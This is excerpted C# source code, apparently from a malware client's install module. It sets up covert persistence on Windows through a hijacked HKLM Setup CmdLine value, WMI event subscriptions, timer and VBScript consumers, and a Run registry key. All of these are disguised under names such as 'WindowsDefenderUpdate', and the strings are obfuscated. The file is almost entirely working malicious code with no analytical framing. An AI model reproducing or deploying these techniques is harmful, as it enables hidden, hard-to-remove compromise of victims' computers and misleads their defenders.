...
namespace Client.Helper
{
	...
	internal class Install
	{
		...
		public static void Loop()
		{
			...
			while (Install.Installing)
			{
				if (!clientInstalled)
				{
					...
					if (!Install.TaskCheck(Config.TaskClient))
					{
					...
					if (Convert.ToBoolean(Config.CmdlineAutorun))
					{
						Install.CmdlineAutorunSet(Config.PathClient);
					}
					if (Convert.ToBoolean(Config.WmiAutorun))
					{
						Install.WmiAutorunSet(Config.PathClient);
					}
				...
				if (Config.InstallWatchDog == EncryptString.Decode("true") && !watchdogInstalled)
				{
					...
					if (!Install.TaskCheck(Config.TaskWatchDog))
					{
				...
				if (!MutexControl.createdNew)
				{
					try
					{
						if (Mutex.OpenExisting(Config.Mutex) != null)
						{
							Methods.Exit();
						}
					}
				...
				if (clientInstalled && (Config.InstallWatchDog != EncryptString.Decode("true") || watchdogInstalled))
				{
					break;
				}
		...
		public static string Uninstall()
		{
			...
			if (Convert.ToBoolean(Config.CmdlineAutorun))
			{
				Install.CmdlineAutorunRemove();
			}
			if (Convert.ToBoolean(Config.WmiAutorun))
			{
				Install.WmiAutorunRemove();
			}
		...
		// Cmdline Autorun - writes to HKLM\SYSTEM\Setup\CmdLine
		public static bool CmdlineAutorunSet(string clientPath)
		{
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(EncryptString.Decode("SYSTEM\\Setup"), true))
				{
					object currentValue = registryKey.GetValue(EncryptString.Decode("CmdLine"));
					if (currentValue == null || (string)currentValue != clientPath)
					{
						registryKey.SetValue(EncryptString.Decode("CmdLine"), clientPath);
					}
					registryKey.Close();
				}
				return true;
		...
		public static void CmdlineAutorunRemove()
		{
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(EncryptString.Decode("SYSTEM\\Setup"), true))
				{
					registryKey.SetValue(EncryptString.Decode("CmdLine"), EncryptString.Decode("cmd.exe /k"));
					registryKey.Close();
				}
			}
			catch
		...
		// WMI Autorun - 4 methods: WMI Event Subscription, StdRegProv, Win32_Process, WMI Consumer
		public static bool WmiAutorunSet(string clientPath)
		{
			try
			{
				// Method 1: WMI Event Filter + CommandLineEventConsumer
				Install.WmiEventSubscription(clientPath);
				// Method 2: StdRegProv via WMI to write registry autorun
				Install.WmiStdRegProvAutorun(clientPath);
				// Method 3: WMI Timer + Win32_Process creation
				Install.WmiTimerProcess(clientPath);
				// Method 4: WMI ActiveScriptEventConsumer
				Install.WmiActiveScriptConsumer(clientPath);
				return true;
			}
			catch
			{
		...
		// Method 1: WMI Event Filter + CommandLineEventConsumer
		private static void WmiEventSubscription(string clientPath)
		{
			try
			{
				ManagementScope scope = new ManagementScope(EncryptString.Decode("root\\subscription"));
				scope.Connect();

				// Create Event Filter (triggers on system startup)
				using (ManagementClass filterClass = new ManagementClass(scope, new ManagementPath(EncryptString.Decode("__EventFilter")), new ObjectGetOptions()))
				{
					ManagementObject filter = filterClass.CreateInstance();
					filter[EncryptString.Decode("Name")] = EncryptString.Decode("WindowsDefenderUpdate");
					filter[EncryptString.Decode("QueryLanguage")] = EncryptString.Decode("WQL");
					filter[EncryptString.Decode("Query")] = EncryptString.Decode("SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_OperatingSystem\"");
					filter.Put();

					// Create CommandLineEventConsumer
					using (ManagementClass consumerClass = new ManagementClass(scope, new ManagementPath(EncryptString.Decode("CommandLineEventConsumer")), new ObjectGetOptions()))
					{
						ManagementObject consumer = consumerClass.CreateInstance();
						consumer[EncryptString.Decode("Name")] = EncryptString.Decode("WindowsDefenderUpdate");
						consumer[EncryptString.Decode("CommandLineTemplate")] = clientPath;
						consumer[EncryptString.Decode("ExecutablePath")] = clientPath;
						consumer.Put();

						// Bind Filter to Consumer
						using (ManagementClass bindingClass = new ManagementClass(scope, new ManagementPath(EncryptString.Decode("__FilterToConsumerBinding")), new ObjectGetOptions()))
						{
							ManagementObject binding = bindingClass.CreateInstance();
							binding[EncryptString.Decode("Filter")] = filter.Path;
							binding[EncryptString.Decode("Consumer")] = consumer.Path;
							binding.Put();
						}
					}
				}
		...
		// Method 2: StdRegProv via WMI to write Run registry key
		private static void WmiStdRegProvAutorun(string clientPath)
		{
			try
			{
				ManagementScope scope = new ManagementScope(EncryptString.Decode("root\\default"));
				scope.Connect();

				using (ManagementClass regProv = new ManagementClass(scope, new ManagementPath(EncryptString.Decode("StdRegProv")), new ObjectGetOptions()))
				{
					object[] methodArgs = new object[] { 2147483649U, EncryptString.Decode("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), EncryptString.Decode("WindowsDefender"), clientPath };
					regProv.InvokeMethod(EncryptString.Decode("SetStringValue"), methodArgs);
				}
			}
			catch
			{
		...
		// Method 3: WMI Timer + Win32_Process creation
		private static void WmiTimerProcess(string clientPath)
		{
			try
			{
				ManagementScope scope = new ManagementScope(EncryptString.Decode("root\\subscription"));
				...
				// Create Timer
				using (ManagementClass timerClass = new ManagementClass(scope, new ManagementPath(EncryptString.Decode("__IntervalTimerInstruction")), new ObjectGetOptions()))
				{
					ManagementObject timer = timerClass.CreateInstance();
					timer[EncryptString.Decode("IntervalBetweenEvents")] = (uint)3600000;
					timer[EncryptString.Decode("SkipIfPassed")] = false;
					timer[EncryptString.Decode("TimerId")] = EncryptString.Decode("WindowsDefenderTimer");
					timer.Put();

					// Create Event Filter for timer
					using (ManagementClass filterClass = new ManagementClass(scope, new ManagementPath(EncryptString.Decode("__EventFilter")), new ObjectGetOptions()))
					{
						ManagementObject filter = filterClass.CreateInstance();
						filter[EncryptString.Decode("Name")] = EncryptString.Decode("WindowsDefenderTimerFilter");
						filter[EncryptString.Decode("QueryLanguage")] = EncryptString.Decode("WQL");
						filter[EncryptString.Decode("Query")] = EncryptString.Decode("SELECT * FROM __TimerEvent WHERE TimerId = \"WindowsDefenderTimer\"");
						filter.Put();

						// Create CommandLineEventConsumer for timer
						using (ManagementClass consumerClass = new ManagementClass(scope, new ManagementPath(EncryptString.Decode("CommandLineEventConsumer")), new ObjectGetOptions()))
						{
							ManagementObject consumer = consumerClass.CreateInstance();
							consumer[EncryptString.Decode("Name")] = EncryptString.Decode("WindowsDefenderTimerConsumer");
							consumer[EncryptString.Decode("CommandLineTemplate")] = clientPath;
							consumer[EncryptString.Decode("ExecutablePath")] = clientPath;
							consumer.Put();
		...
		// Method 4: ActiveScriptEventConsumer (VBScript launcher)
		private static void WmiActiveScriptConsumer(string clientPath)
		{
			try
			{
				ManagementScope scope = new ManagementScope(EncryptString.Decode("root\\subscription"));
				...
				{
					ManagementObject filter = filterClass.CreateInstance();
					filter[EncryptString.Decode("Name")] = EncryptString.Decode("WindowsDefenderScriptFilter");
					filter[EncryptString.Decode("QueryLanguage")] = EncryptString.Decode("WQL");
					filter[EncryptString.Decode("Query")] = EncryptString.Decode("SELECT * FROM __InstanceModificationEvent WITHIN 120 WHERE TargetInstance ISA \"Win32_OperatingSystem\"");
					filter.Put();

					// Create ActiveScriptEventConsumer
					using (ManagementClass consumerClass = new ManagementClass(scope, new ManagementPath(EncryptString.Decode("ActiveScriptEventConsumer")), new ObjectGetOptions()))
					{
						ManagementObject consumer = consumerClass.CreateInstance();
						consumer[EncryptString.Decode("Name")] = EncryptString.Decode("WindowsDefenderScriptConsumer");
						consumer[EncryptString.Decode("ScriptingEngine")] = EncryptString.Decode("VBScript");
						consumer[EncryptString.Decode("ScriptText")] = EncryptString.Decode("CreateObject(\"WScript.Shell\").Run \"") + clientPath.Replace("\\", "\\\\") + EncryptString.Decode("\", 0, False");
						consumer.Put();
		...
		public static void WmiAutorunRemove()
		{
			try
			{
				ManagementScope scope = new ManagementScope(EncryptString.Decode("root\\subscription"));
				...
				string[] consumerNames = new string[] { EncryptString.Decode("WindowsDefenderUpdate"), EncryptString.Decode("WindowsDefenderTimerConsumer"), EncryptString.Decode("WindowsDefenderScriptConsumer") };
				string[] filterNames = new string[] { EncryptString.Decode("WindowsDefenderUpdate"), EncryptString.Decode("WindowsDefenderTimerFilter"), EncryptString.Decode("WindowsDefenderScriptFilter") };

				// Remove bindings
				try
				{
					foreach (ManagementObject binding in new ManagementObjectSearcher(scope, new WqlObjectQuery(EncryptString.Decode("SELECT * FROM __FilterToConsumerBinding"))).Get())
					{
				...
				foreach (string name in consumerNames)
				{
					try
					{
						new ManagementObject(scope, new ManagementPath(EncryptString.Decode("CommandLineEventConsumer.Name=\"") + name + EncryptString.Decode("\"")), new ObjectGetOptions()).Delete();
					}
					catch { }
				}
				...
				foreach (string name in filterNames)
				{
					try
					{
						new ManagementObject(scope, new ManagementPath(EncryptString.Decode("__EventFilter.Name=\"") + name + EncryptString.Decode("\"")), new ObjectGetOptions()).Delete();
					}
					catch { }
				}

				// Remove StdRegProv Run key
				try
				{
					ManagementScope regScope = new ManagementScope(EncryptString.Decode("root\\default"));
					regScope.Connect();
					using (ManagementClass regProv = new ManagementClass(regScope, new ManagementPath(EncryptString.Decode("StdRegProv")), new ObjectGetOptions()))
					{
						object[] methodArgs = new object[] { 2147483649U, EncryptString.Decode("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), EncryptString.Decode("WindowsDefender") };
						regProv.InvokeMethod(EncryptString.Decode("DeleteValue"), methodArgs);
					}
				}
				catch { }
			}
